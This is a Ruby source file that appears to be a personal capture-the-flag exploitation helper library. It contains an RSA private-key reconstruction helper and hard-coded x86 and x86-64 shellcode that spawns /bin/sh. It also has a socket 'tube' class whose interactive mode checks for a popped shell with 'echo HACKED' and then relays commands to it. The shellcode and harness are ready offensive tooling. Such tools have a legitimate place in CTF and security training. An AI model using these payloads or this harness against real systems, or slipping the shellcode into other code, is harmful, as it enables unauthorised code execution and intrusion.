#coding:ascii-8bit
require "socket"
require "openssl"

class OpenSSL::PKey::RSA
    def complete_private_key!
        if self.p == 0 || self.q == 0
            raise "p or q is empty"
        end
        if self.e == 0
            raise "e is empty"
        end

        self.n = self.p * self.q
        self.d = self.e.mod_inverse((self.p - 1) * (self.q - 1))
        self.dmp1 = self.d % (self.p - 1)
        self.dmq1 = self.d % (self.q - 1)
        self.iqmp = self.q.mod_inverse(self.p)

        return self
    end
end

class PwnLib
    def self.shellcode_x86
        # http://inaz2.hatenablog.com/entry/2014/03/13/013056
        "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
    end

    def self.shellcode_x86_64
        # http://shell-storm.org/shellcode/files/shellcode-806.php
        "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    end
end

class PwnTube
    attr_accessor :socket, :wait_time, :debug

    def initialize(host, port, &block)
        @wait_time = 0.1
        @debug = false
        @socket = TCPSocket.open(host, port)
        puts "[*] connected"

        if block == nil
            return self
        end
        block.call(self)
        self.close
        return nil
    end

    def PwnTube.open(host, port, &block)
        PwnTube.new(host, port, &block)
    end

    def close
        @socket.close
        puts "[*] connection closed"
    end

    def send(msg)
        @socket.send(msg, 0)
        puts "<< #{msg.inspect}" if @debug
        sleep(@wait_time)
    end

    def recv(size = 8192)
        @socket.recv(size).tap{|a| puts ">> #{a.inspect}" if @debug}
    end

    def recv_until(pattern)
        s = ""
        if !pattern.is_a?(String) && !pattern.is_a?(Regexp)
            raise "type error"
        end
        while true
            if pattern.is_a?(String) && s.include?(pattern) || pattern.is_a?(Regexp) && s =~ pattern
                break
            end
            s << recv(1)
        end
        return s
    end

    def recv_capture(pattern)
        recv_until(pattern).match(pattern).captures
    end

    def interactive(shellmode = true)

        if shellmode
            puts "[*] waiting for shell..."
            self.send("echo HACKED\n")
            self.recv_until("HACKED\n")
        end

        send_thread = Thread.new(self){|tube|
            begin
                while true
                    tube.socket.send(gets.chomp + "\n", 0)
                end
            rescue
            end
        }
        recv_thread = Thread.new(self){|tube|
            begin
                while true
                    if IO.select([tube.socket], [], [], 0.05) != nil
                        buf = tube.socket.recv(8192)
                        if buf == ""
                            break
                        end
                        print buf
                        $>.flush
                    end
                end
            rescue => e
                puts "[!] #{e}"
            end
            send_thread.kill
        }

        puts "[*] interactive mode"
        $>.flush
        
        [send_thread, recv_thread].each{|t| t.join}
        puts "[*] end interactive mode"
        $>.flush
    end
end